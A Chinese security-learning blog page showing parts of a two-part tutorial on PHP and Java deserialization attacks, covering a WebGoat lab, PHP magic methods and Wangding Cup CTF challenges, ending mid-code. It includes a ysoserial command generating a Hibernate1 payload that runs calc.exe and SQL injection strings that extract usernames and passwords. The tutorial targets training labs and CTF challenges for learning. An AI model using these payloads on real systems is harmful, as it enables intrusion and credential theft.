src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image9.png" alt="image9"></p><p>浏览器打开127.0.0.1:8080</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image10.png" alt="image10"></p><h3 id="2-源码分析"><a href="#2-源码分析" class="headerlink" title="2.源码分析"></a>2.源码分析</h3><p>使用idea工具打开webgoat-server-8.1.0.jar，分析源代码。</p><p><strong>打开方式：</strong></p><p>1.新建一个文件夹，将所需要查看的jar包放入该文件夹中；</p><p>2.打开IDEA，点击file，再点击open；</p><p>3.找到刚刚jar放入的文件夹，选中并打开；</p><p>4.打开之后，右键该jar包，点击Add as Library；</p><p>5.操作完成之后就可以对jar的源码进行查看了。</p><p>找到反序列化函数</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image11.png" alt="image11"></p><p>反序列化这里可以执行对象中的代码</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image12.png" alt="image12"></p><p>此时，基本可以确定存在反序列化漏洞。如何利用？</p><p>本题目页面上的数据以rO0AB开头，可以确定这串就是JAVA序列化base64加密的数据。</p><p>所以我们在构造payload时，需要如下几步：</p><p><strong>构造含有命令(比如ipconfig)的对象–&gt;序列化–&gt;base64–&gt;最终payload（rO0AB开头字符串）</strong></p><p>但是攻击时，还需要考虑回显问题，若系统不回显命令执行后的结果，即使我们攻击成功，也没用。因此我们一般需要构造反弹shell。</p><p>这个过程挺复杂，手工的话，需要一个一个尝试，效率低且不一定成功。因此我们可以使用工具生成payload。</p><h3 id="3-Java反序列化工具使用"><a href="#3-Java反序列化工具使用" class="headerlink" title="3.Java反序列化工具使用"></a>3.Java反序列化工具使用</h3><p><strong>Java反序列化验证工具下载地址：</strong><a target="_blank" rel="noopener" href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p><p>进入该工具目录的cmd界面，执行命令<code>java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-master-8eb5cbfbf6-1.jar ysoserial.GeneratePayload Hibernate1 calc.exe &gt; payload.bin</code></p><p>这里需要提前将webgoat中的hibernate-core-5.4.9.Final.jar放入ysoserial目录中，不然会报无法加载类错误。</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image13.png" alt="image13"></p><p>查看payload</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image14.png" alt="image14"></p><p>这里还需要将该payload进行base64加密（ysoserial只能进行反序列化，它不负责base64加密）</p><p>写一个python脚本，执行，实现base64加密</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image15.png" alt="image15"></p><p>生成payload.txt</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image16.png" alt="image16"></p><p>全选后复制粘贴到webgoat靶场的输入框，点击提交，弹出计算器。</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image17.png" alt="image17"></p><h2 id="四-案例3——2020网鼎杯-朱雀组-Web-think-java真题复现"><a href="#四-案例3——2020网鼎杯-朱雀组-Web-think-java真题复现" class="headerlink" title="四.案例3——2020网鼎杯-朱雀组-Web-think_java真题复现"></a>四.案例3——2020网鼎杯-朱雀组-Web-think_java真题复现</h2><p>CTFHub官网：<a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/challenge">https://www.ctfhub.com/#/challenge</a></p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image18.png" alt="image18"></p><h3 id="1-页面打开如下"><a href="#1-页面打开如下" class="headerlink" title="1.页面打开如下"></a>1.页面打开如下</h3><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image19.png" alt="image19"></p><h3 id="2-分析下载的附件"><a href="#2-分析下载的附件" class="headerlink" title="2.分析下载的附件"></a>2.分析下载的附件</h3><p>根据提示附件进行javaweb代码审计，发现可能存在注入漏洞。</p><p>另外有swagger开发接口，测试注入漏洞及访问接口进行调用测试。</p><p>数据库名：myapp。列名：name,pwd</p><p>注入测试：</p><p><code>POST /common/test/sqlDict</code></p><p><code>dbName=myapp?a=&#39; union select (select name from user)# 得到用户名</code></p><p><code>dbName=myapp?a=&#39; union select (select pwd from user)# 得到密码</code></p><p><strong>发现注入路径：</strong></p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image20.png" alt="image20"></p><p><strong>发现注入参数：</strong></p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image21.png" alt="image21"></p><p>构造请求，注入成功，得到账户密码</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image22.png" alt="image22"></p><p>此处一直抓不到密码，也不知什么原因</p><p><img src="/2022/03/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/image23.png" alt="image23"></p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/" class="post-title-link" itemprop="url">反序列化之PHP&JAVA全解（上）</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-03-23 19:46:25" itemprop="dateCreated datePublished" datetime="2022-03-23T19:46:25+08:00">2022-03-23</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-03-30 14:16:47" itemprop="dateModified" datetime="2022-03-30T14:16:47+08:00">2022-03-30</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>5.5k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>5 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="反序列化之PHP-amp-JAVA全解（上）"><a href="#反序列化之PHP-amp-JAVA全解（上）" class="headerlink" title="反序列化之PHP&amp;JAVA全解（上）"></a>反序列化之PHP&amp;JAVA全解（上）</h1><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image1.webp" alt="image1"></p><h2 id="一-php反序列化原理"><a href="#一-php反序列化原理" class="headerlink" title="一.php反序列化原理"></a>一.php反序列化原理</h2><ul><li><p>未对用户<strong>输入的序列化字符串</strong>进行检测，导致攻击者可以<strong>控制反序列化过程</strong>，从而<strong>导致代码执行</strong>，SQL 注入，目录遍历等不可控后果。</p></li><li><p>其实跟文件解析差不多，都是由于传递的恶意参数被执行（序列化和反序列化相当于加解密过程）</p></li><li><p>在<strong>反序列化</strong>的过程中自动<strong>触发了某些魔术方法</strong>。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p></li><li><p>序列化函数：<strong>serialize()</strong> //将一个<strong>对象</strong>转换成一个<strong>字符串</strong></p></li><li><p>反序列化函数：<strong>unserialize()</strong> //将<strong>字符串</strong>还原成一个<strong>对象</strong></p></li></ul><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image2.webp" alt="image2"></p><p>触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法（魔术方法触发条件：1.反序列化2.存在类2.类中存在魔术方法）：</p><ul><li><p>__construct()//<strong>创建对象</strong>时触发</p></li><li><p>__destruct() //<strong>对象</strong>被<strong>销毁</strong>时触发</p></li><li><p>__call() //在<strong>对象</strong>上下文中<strong>调用不可访问的方法</strong>时触发</p></li><li><p>__callStatic() //在<strong>静态</strong>上下文中<strong>调用不可访问的方法</strong>时触发</p></li><li><p>__get() //用于从<strong>不可访问的属性读取</strong>数据</p></li><li><p>__set() //用于将<strong>数据写入不可访问</strong>的属性</p></li><li><p>__isset() //在不可访问的<strong>属性</strong>上**调用 isset()或 empty()**触发</p></li><li><p>__unset() //在不可访问的<strong>属性</strong>上使用 **unset()**时触发</p></li><li><p>__invoke() //当脚本尝试将<strong>对象调用为函数</strong>时触发</p></li></ul><h2 id="二-php反序列化热身题——无类问题——本地"><a href="#二-php反序列化热身题——无类问题——本地" class="headerlink" title="二.php反序列化热身题——无类问题——本地"></a>二.php反序列化热身题——无类问题——本地</h2><h3 id="1-序列化"><a href="#1-序列化" class="headerlink" title="1.序列化"></a>1.序列化</h3><p>代码</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image3.png" alt="image3"></p><p>序列化后的格式</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image4.png" alt="image4"></p><p>访问结果（s指的是string，变量长度为3，变量名为zym）</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image5.png" alt="image5"></p><h3 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h3><p>代码</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image6.png" alt="image6"></p><p>访问结果</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image7.png" alt="image7"></p><h3 id="3-本地源码分析"><a href="#3-本地源码分析" class="headerlink" title="3.本地源码分析"></a>3.本地源码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$KEY</span> = <span class="string">&quot;zym&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];	<span class="comment">//传参</span></span><br><span class="line"><span class="comment">//判断传递的参数反序列化之后等不等于zym（注意三个等号）</span></span><br><span class="line"><span class="comment">//==要求数据类型一致，如果不一致就会被强制转化（意思是不用相等）</span></span><br><span class="line"><span class="comment">//===要求数据类型也相等</span></span><br><span class="line"><span class="keyword">if</span> (unserialize(<span class="variable">$str</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="comment">//以下为魔术方法，创建对象时触发</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$test</span> =<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了构造函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了析构函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//反序列化会检测是否存在wakeup方法，存在则优先调用，为对象准备资源</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了苏醒函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;创建对象a&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ABC;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;序列化&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_ser</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;反序列化&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_unser</span> = unserialize(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;对象快要死了！&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php文件</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image8.png" alt="image8"></p><p>访问脚本，这里参数str没有赋值，所以不等，所以显示源码</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image9.png" alt="image9"></p><p>输入参数<code>s:3:&quot;zym&quot;;</code>（执行了包含文件）</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image10.png" alt="image10"></p><h3 id="4-key-123"><a href="#4-key-123" class="headerlink" title="4.key=123"></a>4.key=123</h3><p>str=i（数字型没有长度）</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image11.png" alt="image11"></p><p>输出为</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image12.png" alt="image12"></p><h2 id="三-CTF反序列化真题1（无类执行）"><a href="#三-CTF反序列化真题1（无类执行）" class="headerlink" title="三.CTF反序列化真题1（无类执行）"></a>三.CTF反序列化真题1（无类执行）</h2><h3 id="1-理论分析（题目找不到，只能理论分析）"><a href="#1-理论分析（题目找不到，只能理论分析）" class="headerlink" title="1.理论分析（题目找不到，只能理论分析）"></a>1.理论分析（题目找不到，只能理论分析）</h3><p>表单是死的，点不动，根据提示发现是传参</p><h3 id="2-源代码分析"><a href="#2-源代码分析" class="headerlink" title="2.源代码分析"></a>2.源代码分析</h3><p>包含flag.php文件</p><p>如果get传参不为空，就显示源码</p><p>如果get没传数据，cookie传参反序列化和包含文件的key相等（注意是===，即要求数值型也要相等），就输出flag变量</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image13.png" alt="image13"></p><h3 id="3-解题分析"><a href="#3-解题分析" class="headerlink" title="3.解题分析"></a>3.解题分析</h3><p>$key赋值在下方，所以前面判断的时候key为空（代码执行的先后顺序问题）</p><p>要执行cookie，get传递的参数应该为空</p><p>应该将空序列化（注意空不是空格）</p><h2 id="四-CTF反序列化练习题——有类方法触发——本地"><a href="#四-CTF反序列化练习题——有类方法触发——本地" class="headerlink" title="四.CTF反序列化练习题——有类方法触发——本地"></a>四.CTF反序列化练习题——有类方法触发——本地</h2><p>本地代码</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image14.png" alt="image14"></p><p>访问结果</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image15.png" alt="image15"></p><p><strong>结果分析：</strong></p><ul><li><p>创建对象触发construct方法，输出构造函数</p></li><li><p>反序列化触发wakeup方法，输出苏醒函数（序列化会检查方法内是否存在sleep函数，如果存在就优先调用；反序列化就调用wakeup函数）</p></li><li><p>最后一个程序结束后触发destruct函数，输出析构函数</p></li><li><p>如果有tostring()函数，存在echo时或者拼接字符串时都会被调用</p></li></ul><h2 id="五-网鼎杯-2020-青龙大真题舒服下-有类魔术方法触发-实例"><a href="#五-网鼎杯-2020-青龙大真题舒服下-有类魔术方法触发-实例" class="headerlink" title="五.网鼎杯 2020 青龙大真题舒服下-有类魔术方法触发-实例"></a>五.网鼎杯 2020 青龙大真题舒服下-有类魔术方法触发-实例</h2><h3 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image16.png" alt="image16"></p><h3 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//包含文件flag.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment">//高亮源代码，使用该函数则整个文件都将在html页面中显示</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//protected表示该变量是受保护的，访问的权限是只有在子类和本类中才可以被访问到</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//如果filename和content都存在，并且content的长度小于100，就将content写入filename，并且输出成功。否则输出失败</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//如果filename存在，就读取文件，并且打印读取的内容</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span 